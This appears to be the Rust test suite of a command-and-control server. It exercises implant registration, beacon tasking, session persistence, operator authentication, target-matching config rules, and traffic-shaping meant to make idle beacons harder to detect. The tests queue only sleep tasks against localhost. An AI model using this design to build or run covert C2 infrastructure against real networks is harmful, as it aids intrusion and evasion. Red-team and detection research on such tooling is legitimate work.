            config: SyncMutex::new(ConfigRules::default()),
            config_path: None,
        })
    }

    fn register_info(token: u64) -> RegisterInfo {
        RegisterInfo {
            session_token: token,
            hostname: "LAB".into(),
            username: "lab".into(),
            domain: "LAB".into(),
            pid: 100,
            ppid: 4,
            arch: message::ARCH_X64,
            integrity_level: 2,
            os_build: "22631".into(),
            implant_version: "test".into(),
        }
    }

    fn spawn_server(
        server_end: DuplexStream,
        state: Arc<AppState>,
        profile: Profile,
    ) -> tokio::task::JoinHandle<()> {
        tokio::spawn(async move {
            let addr: SocketAddr = "127.0.0.1:50000".parse().unwrap();
            let _ = run_session(server_end, addr, state, profile, None).await;
        })
    }

    /// Handshake + REGISTER through the real wire path, tagged with the
    /// demux headers exactly as the implant sends them.
    async fn link(
        stream: &mut DuplexStream,
        state: &AppState,
        profile: &Profile,
        token: u64,
    ) -> Session {
        let uri = profile.uris[0].as_str();
        let tag = token.to_string();
        let (secret, hello) = ClientHello::generate();
        write_request(
            stream,
            "POST",
            uri,
            "h",
            "ua",
            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &tag)],
            &hello.to_bytes(),
        )
        .await
        .unwrap();
        let resp = read_response(stream).await.unwrap();
        assert_eq!(resp.status, 200);
        let raw: [u8; crypto::SERVER_HELLO_LEN] = resp.body.as_slice().try_into().unwrap();
        let mut session = crypto::client_finish(
            &state.signing_key.verifying_key(),
            secret,
            &hello,
            &crypto::ServerHello::from_bytes(&raw),
        )
        .unwrap();
        let (mt, body) = Message::Register(register_info(token)).encode();
        let frame = session.seal(mt, &body).unwrap();
        write_request(
            stream,
            "POST",
            uri,
            "h",
            "ua",
            &[(HDR_SESSION, &tag)],
            &frame,
        )
        .await
        .unwrap();
        let resp = read_response(stream).await.unwrap();
        assert_eq!(resp.status, 200);
        session
    }

    async fn poll(
        stream: &mut DuplexStream,
        profile: &Profile,
        session: &mut Session,
        token: u64,
    ) -> Vec<(u8, Vec<u8>)> {
        let (status, body) = poll_raw(stream, profile, session, token, HDR_SESSION).await;
        assert_eq!(status, 200);
        open_frames(&body, session).unwrap()
    }

    /// Poll returning (status, body); `tag_header` is "Cookie" or
    /// "X-Session" so routing by cookie is testable.
    async fn poll_raw(
        stream: &mut DuplexStream,
        profile: &Profile,
        session: &mut Session,
        token: u64,
        tag_header: &str,
    ) -> (u16, Vec<u8>) {
        let uri = profile.uris[0].as_str();
        let (mt, body) = Message::TaskPoll.encode();
        let frame = session.seal(mt, &body).unwrap();
        let tag = if tag_header == "Cookie" {
            format!("{}={}", profile.cookie_name, token)
        } else {
            token.to_string()
        };
        write_request(
            stream,
            "POST",
            uri,
            "h",
            "ua",
            &[(tag_header, &tag)],
            &frame,
        )
        .await
        .unwrap();
        let resp = read_response(stream).await.unwrap();
        (resp.status, resp.body)
    }

    /// Overrides the reported implant build version of a session.
    async fn set_implant_version(state: &AppState, token: u64, version: &str) {
        let id = *state.tokens.read().await.get(&token).unwrap();
        let live = state.sessions.read().await.get(&id).unwrap().clone();
        live.info.lock().unwrap().implant_version = version.to_string();
    }

    fn contains_task(frames: &[(u8, Vec<u8>)], id: u32) -> bool {
        frames.iter().any(|(mt, body)| {
            *mt == msg::TASK
                && matches!(
                    Message::decode(*mt, body),
                    Ok(Message::Task(Task { id: want, .. })) if want == id
                )
        })
    }

    /// The Cloudflare origin-pooling shape: two logical beacon transports
    /// whose requests interleave on ONE server-side connection. Header
    /// routing must keep them independent, and a bad request must cost
    /// itself, not the connection.
    #[tokio::test]
    async fn pooled_conn_routes_by_session_header() {
        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(None, None);
        let profile = Profile::default();
        spawn_server(server_end, state.clone(), profile.clone());

        let mut a = link(&mut client, &state, &profile, 1111).await;
        let mut b = link(&mut client, &state, &profile, 2222).await;

        // Queue a task into session A through the registry (as mgmt does).
        let live_a = {
            let id = *state.tokens.read().await.get(&1111).unwrap();
            state.sessions.read().await.get(&id).unwrap().clone()
        };
        live_a
            .pending
            .lock()
            .unwrap()
            .push_back(Message::Task(Task {
                id: 77,
                body: TaskBody::Sleep {
                    secs: 1,
                    jitter: 0.0,
                },
            }));

        assert!(contains_task(
            &poll(&mut client, &profile, &mut a, 1111).await,
            77
        ));
        assert!(!contains_task(
            &poll(&mut client, &profile, &mut b, 2222).await,
            77
        ));

        // A request tagged with an unknown token is refused without
        // killing the pooled connection.
        write_request(
            &mut client,
            "POST",
            profile.uris[0].as_str(),
            "h",
            "ua",
            &[(HDR_SESSION, "9999")],
            b"junk",
        )
        .await
        .unwrap();
        let resp = read_response(&mut client).await.unwrap();
        assert_eq!(resp.status, 400);

        // Both sessions still ride the same connection afterwards.
        let _ = poll(&mut client, &profile, &mut a, 1111).await;
        let _ = poll(&mut client, &profile, &mut b, 2222).await;
    }

    /// A server restart (redeploy) reloads the persisted registry; the
    /// beacon resumes into the SAME session id and drains tasks queued
    /// while it had no transport.
    #[tokio::test]
    async fn sessions_survive_restart_and_resume() {
        let dir = std::env::temp_dir().join(format!("abraham-state-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("sessions.json");

        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(Some(path.clone()), None);
        let profile = Profile::default();
        let server = spawn_server(server_end, state.clone(), profile.clone());
        let mut a = link(&mut client, &state, &profile, 4242).await;
        let _ = poll(&mut client, &profile, &mut a, 4242).await;
        drop(client);
        let _ = server.await;

        // Restart: fresh process state, same file.
        let state2 = test_state(Some(path.clone()), None);
        assert_eq!(load_state(&state2, &path).await.unwrap(), 1);
        assert_eq!(*state2.tokens.read().await.get(&4242).unwrap(), 1);

        // Task queued while the beacon has no transport.
        let live = state2.sessions.read().await.get(&1).unwrap().clone();
        live.pending.lock().unwrap().push_back(Message::Task(Task {
            id: 901,
            body: TaskBody::Sleep {
                secs: 1,
                jitter: 0.0,
            },
        }));

        // Re-link with the SAME token: resumes into session 1 and the
        // offline-queued task drains.
        let (mut client2, server_end2) = tokio::io::duplex(64 * 1024);
        let server2 = spawn_server(server_end2, state2.clone(), profile.clone());
        let mut a2 = link(&mut client2, &state2, &profile, 4242).await;
        assert!(contains_task(
            &poll(&mut client2, &profile, &mut a2, 4242).await,
            901
        ));
        assert_eq!(*state2.tokens.read().await.get(&4242).unwrap(), 1);
        drop(client2);
        let _ = server2.await;

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Tasks queued BEFORE the restart persist and still deliver after
    /// it — the queue rides in state/sessions.json, not memory.
    #[tokio::test]
    async fn queued_tasks_survive_restart() {
        let dir = std::env::temp_dir().join(format!("abraham-pending-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("sessions.json");

        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(Some(path.clone()), None);
        let profile = Profile::default();
        let server = spawn_server(server_end, state.clone(), profile.clone());
        let mut a = link(&mut client, &state, &profile, 5151).await;
        let _ = poll(&mut client, &profile, &mut a, 5151).await;

        // Queue WITHOUT polling it out, then persist (queue_task would
        // persist; here we drive the queue directly like the tests do).
        let live = {
            let id = *state.tokens.read().await.get(&5151).unwrap();
            state.sessions.read().await.get(&id).unwrap().clone()
        };
        live.pending.lock().unwrap().push_back(Message::Task(Task {
            id: 808,
            body: TaskBody::Sleep {
                secs: 1,
                jitter: 0.0,
            },
        }));
        persist_state(&state).await;
        drop(client);
        let _ = server.await;

        // Restart: the undelivered task reloads with the session.
        let state2 = test_state(Some(path.clone()), None);
        assert_eq!(load_state(&state2, &path).await.unwrap(), 1);
        let (mut client2, server_end2) = tokio::io::duplex(64 * 1024);
        let server2 = spawn_server(server_end2, state2.clone(), profile.clone());
        let mut a2 = link(&mut client2, &state2, &profile, 5151).await;
        assert!(contains_task(
            &poll(&mut client2, &profile, &mut a2, 5151).await,
            808
        ));
        drop(client2);
        let _ = server2.await;

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The audit log records the session lifecycle: new session, task
    /// queued, task delivered.
    #[tokio::test]
    async fn audit_log_records_lifecycle() {
        let dir = std::env::temp_dir().join(format!("abraham-audit-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let audit_path = dir.join("audit.jsonl");

        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(None, None);
        *state.audit_path.lock().unwrap() = Some(audit_path.clone());
        let profile = Profile::default();
        let server = spawn_server(server_end, state.clone(), profile.clone());
        let mut a = link(&mut client, &state, &profile, 6161).await;

        let queued = queue_task(
            &state,
            &json!({ "session": 1 }),
            TaskBody::Sleep {
                secs: 1,
                jitter: 0.0,
            },
        )
        .await;
        assert_eq!(queued["queued"], 1);
        assert!(contains_task(
            &poll(&mut client, &profile, &mut a, 6161).await,
            1
        ));
        drop(client);
        let _ = server.await;

        let log = std::fs::read_to_string(&audit_path).unwrap();
        assert!(log.contains("\"event\":\"session_new\""));
        assert!(log.contains("\"event\":\"task_queued\""));
        assert!(
            log.contains("\"event\":\"task_delivered\""),
            "audit log: {log}"
        );
        assert!(log.contains("\"kind\":\"sleep\""));

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// With --mgmt-token set, clients must open with {"auth": ...} or
    /// be refused; the right token gets through.
    #[tokio::test]
    async fn mgmt_requires_auth_when_token_set() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let state = test_state(None, Some("s3cret".into()));
        let server = tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    return;
                };
                let state = state.clone();
                tokio::spawn(async move {
                    let _ = run_mgmt(stream, state).await;
                });
            }
        });

        // Wrong first line: refused and disconnected.
        let mut bad = tokio::net::TcpStream::connect(addr).await.unwrap();
        bad.write_all(b"{\"cmd\":\"sessions\"}\n").await.unwrap();
        let mut buf = vec![0u8; 256];
        let n = bad.read(&mut buf).await.unwrap();
        assert!(n > 0, "refused client must get the error line");
        assert!(std::str::from_utf8(&buf[..n])
            .unwrap()
            .contains("unauthorized"));
        assert_eq!(bad.read(&mut buf).await.unwrap_or(0), 0, "then closed");

        // Right token: ack line, then commands flow — line by line, so
        // the client never waits on data already delivered.
        let good = tokio::net::TcpStream::connect(addr).await.unwrap();
        let (rd, mut wr) = good.into_split();
        let mut lines = BufReader::new(rd).lines();
        wr.write_all(b"{\"auth\":\"s3cret\"}\n").await.unwrap();
        let ack = lines.next_line().await.unwrap().unwrap();
        assert_eq!(ack, "{\"ok\":true}");
        wr.write_all(b"{\"cmd\":\"sessions\"}\n").await.unwrap();
        let sessions = lines.next_line().await.unwrap().unwrap();
        assert!(sessions.contains("\"sessions\""), "got: {sessions}");

        server.abort();
    }

    /// Idle polls from 0.2.0+ implants answer a body-less 204 (an idle
    /// beacon stops looking like a constant binary blob); legacy builds
    /// keep the sealed empty batch with 200 (T035).
    #[tokio::test]
    async fn empty_poll_is_204_for_new_implants_only() {
        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(None, None);
        let profile = Profile::default();
        spawn_server(server_end, state.clone(), profile.clone());

        let mut a = link(&mut client, &state, &profile, 7171).await;
        set_implant_version(&state, 7171, "0.2.0").await;
        let (status, body) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
        assert_eq!(status, 204);
        assert!(body.is_empty());

        let mut b = link(&mut client, &state, &profile, 7272).await;
        set_implant_version(&state, 7272, "0.1.0").await;
        let (status, body) = poll_raw(&mut client, &profile, &mut b, 7272, HDR_SESSION).await;
        assert_eq!(status, 200);
        let frames = open_frames(&body, &mut b).unwrap();
        assert_eq!(frames.len(), 1);
        assert_eq!(frames[0].0, msg::BATCH_END);

        // A queued task still delivers as a normal 200 batch.
        let live = {
            let id = *state.tokens.read().await.get(&7171).unwrap();
            state.sessions.read().await.get(&id).unwrap().clone()
        };
        live.pending.lock().unwrap().push_back(Message::Task(Task {
            id: 42,
            body: TaskBody::Sleep {
                secs: 1,
                jitter: 0.0,
            },
        }));
        let (status, body) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
        assert_eq!(status, 200);
        assert!(contains_task(&open_frames(&body, &mut a).unwrap(), 42));
        // Delivered: the next idle poll is empty again -> 204.
        let (status, _) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
        assert_eq!(status, 204);
    }

    // ------------------------------------------------------------------
    // ABR-T037: server-driven configuration
    // ------------------------------------------------------------------

    #[test]
    fn config_rule_matcher_and_precedence() {
        let net_rule = ConfigRule {
            note: "net".into(),
            match_domain: None,
            match_hostname_prefix: None,
            match_user: None,
            match_net: Some("10.20.0.0/16".into()),
            sleep_secs: Some(5),
            jitter: None,
            uris: Vec::new(),
            user_agents: Vec::new(),
        };
        let domain_rule = ConfigRule {
            note: "fiap".into(),
            match_domain: Some("FIAP".into()),
            match_hostname_prefix: None,
            match_user: None,
            match_net: None,
            sleep_secs: Some(2),
            jitter: Some(0.1),
            uris: vec!["/cdn/update".into()],
            user_agents: Vec::new(),
        };
        // Netblock matching, including a /16 boundary.
        assert!(net_rule.matches("x", "y", "z", "10.20.255.254"));
        assert!(!net_rule.matches("x", "y", "z", "10.21.0.1"));
        // Domain matching is case-insensitive on both sides.
        assert!(domain_rule.matches("fiap", "PA202MICRO35", "labsfiap", "1.2.3.4"));
        assert!(!domain_rule.matches("OTHER", "PA202MICRO35", "labsfiap", "1.2.3.4"));
        // Hostname prefix matching.
        let mut prefix_rule = net_rule.clone();
        prefix_rule.match_hostname_prefix = Some("pa202".into());
        prefix_rule.match_net = None;
        assert!(prefix_rule.matches("X", "PA202MICRO35", "u", "9.9.9.9"));
        assert!(!prefix_rule.matches("X", "WRK0001", "u", "9.9.9.9"));
        // Malformed CIDR never matches.
        let mut bad_rule = net_rule.clone();
        bad_rule.match_net = Some("10.0.0.0/40".into());
        assert!(!bad_rule.matches("x", "y", "z", "10.0.0.1"));
        // FIRST rule that matches wins.
        let rules = ConfigRules {
            epoch: 9,
            rules: vec![net_rule, domain_rule],
        };
        let hit = rules
            .resolve("FIAP", "PA202MICRO35", "labsfiap", "10.20.1.1")
            .unwrap();
        assert_eq!(hit.note, "net", "first matching rule must win");
        // Update derivation keeps unspecified fields as KEEP sentinels.
        let only_sleep = ConfigRule {
            note: "only-sleep".into(),
            sleep_secs: Some(3),
            ..Default::default()
        };
        let update = only_sleep.update(4);
        assert_eq!(update.sleep_secs, 3);
        assert_eq!(update.jitter, ConfigUpdate::KEEP_JITTER);
        assert!(update.uris.is_empty());
        assert!(update.changes_something());
        assert!(!ConfigUpdate::noop(4).changes_something());
    }

    #[test]
    fn config_gate_by_implant_version() {
        assert!(implant_supports_config("0.2.1"));
        assert!(implant_supports_config("0.3.0"));
        assert!(!implant_supports_config("0.2.0"));
        assert!(!implant_supports_config("0.1.0"));
        assert!(!implant_supports_config("test"));
    }

    /// Registers with a custom implant version (link() hardcodes the
    /// test build string).
    async fn link_as_version(
        stream: &mut DuplexStream,
        state: &AppState,
        profile: &Profile,
        token: u64,
        version: &str,
    ) -> Session {
        let session = link(stream, state, profile, token).await;
        set_implant_version(state, token, version).await;
        session
    }

    #[tokio::test]
    async fn config_rides_register_and_re_resolves_on_poll() {
        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(None, None);
        let profile = Profile::default();
        spawn_server(server_end, state.clone(), profile.clone());

        // Rule active BEFORE the implant links: the update must ride the
        // REGISTER response.
        {
            let mut rules = state.config.lock().unwrap();
            rules.epoch += 1;
            rules.rules.push(ConfigRule {
                note: "lab fast".into(),
                match_domain: Some("LAB".into()),
                sleep_secs: Some(2),
                jitter: Some(0.1),
                ..Default::default()
            });
        }
        let uri = profile.uris[0].as_str();
        // link() consumes the register response; do the handshake part
        // manually here so the response frames can be inspected.
        let tag = 9090u64.to_string();
        let (secret, hello) = ClientHello::generate();
        write_request(
            &mut client,
            "POST",
            uri,
            "h",
            "ua",
            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &tag)],
            &hello.to_bytes(),
        )
        .await
        .unwrap();
        let resp = read_response(&mut client).await.unwrap();
        let raw: [u8; crypto::SERVER_HELLO_LEN] = resp.body.as_slice().try_into().unwrap();
        let mut session = crypto::client_finish(
            &state.signing_key.verifying_key(),
            secret,
            &hello,
            &crypto::ServerHello::from_bytes(&raw),
        )
        .unwrap();
        let mut info = register_info(9090);
        info.implant_version = "0.2.1".into();
        let (mt, body) = Message::Register(info).encode();
        let frame = session.seal(mt, &body).unwrap();
        write_request(
            &mut client,
            "POST",
            uri,
            "h",
            "ua",
            &[(HDR_SESSION, &tag)],
            &frame,
        )
        .await
        .unwrap();
        let resp = read_response(&mut client).await.unwrap();
        assert_eq!(resp.status, 200);
        let frames = open_frames(&resp.body, &mut session).unwrap();
        let config = frames
            .iter()
            .find(|(mt, _)| *mt == msg::CONFIG)
            .expect("REGISTER response carries the CONFIG frame");
        let Message::Config(update) = Message::decode(msg::CONFIG, &config.1).unwrap() else {
            panic!("undecodable CONFIG");
        };
        assert_eq!(update.sleep_secs, 2);
        assert_eq!(update.jitter, 0.1);

        // Idle poll after delivery: nothing new -> plain 204 again.
        let (status, _) = poll_raw(&mut client, &profile, &mut session, 9090, HDR_SESSION).await;
        assert_eq!(status, 204);

        // Operator tightens the rule: the next poll re-delivers BEFORE
        // any tasking and is never a 204.
        {
            let mut rules = state.config.lock().unwrap();
            rules.epoch += 1;
            rules.rules[0].sleep_secs = Some(1);
        }
        let (status, body) = poll_raw(&mut client, &profile, &mut session, 9090, HDR_SESSION).await;
        assert_eq!(status, 200);
        let frames = open_frames(&body, &mut session).unwrap();
        let config = frames
            .iter()
            .find(|(mt, _)| *mt == msg::CONFIG)
            .expect("changed rule re-delivers on the next poll");
        let Message::Config(update) = Message::decode(msg::CONFIG, &config.1).unwrap() else {
            panic!("undecodable CONFIG");
        };
        assert_eq!(update.sleep_secs, 1);

        // A 0.2.0 implant never receives CONFIG frames (strict decoder).
        let mut old = link_as_version(&mut client, &state, &profile, 9191, "0.2.0").await;
        {
            let mut rules = state.config.lock().unwrap();
            rules.epoch += 1;
            rules.rules.push(ConfigRule {
                note: "all".into(),
                sleep_secs: Some(4),
                ..Default::default()
            });
        }
        let (status, body) = poll_raw(&mut client, &profile, &mut old, 9191, HDR_SESSION).await;
        assert_eq!(status, 204, "legacy implant keeps the plain 204");
        assert!(body.is_empty());
    }

    /// The session token rides in the profile-named cookie instead of
    /// the custom header (T035): routing must work cookie-only.
    #[tokio::test]
    async fn cookie_routes_the_session_token() {
        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
        let state = test_state(None, None);
        let profile = Profile::default();
        spawn_server(server_end, state.clone(), profile.clone());

        let mut a = link(&mut client, &state, &profile, 8181).await;
        set_implant_version(&state, 8181, "test").await;

        let live = {
            let id = *state.tokens.read().await.get(&8181).unwrap();
            state.sessions.read().await.get(&id).unwrap().clone()
        };
        live.pending.lock().unwrap().push_back(Message::Task(Task {
            id: 55,
            body: TaskBody::Sleep {
                secs: 1,
                jitter: 0.0,
            },
        }));
        let (status, body) = poll_raw(&mut client, &profile, &mut a, 8181, "Cookie").await;
        assert_eq!(status, 200);
        assert!(contains_task(&open_frames(&body, &mut a).unwrap(), 55));
    }
}
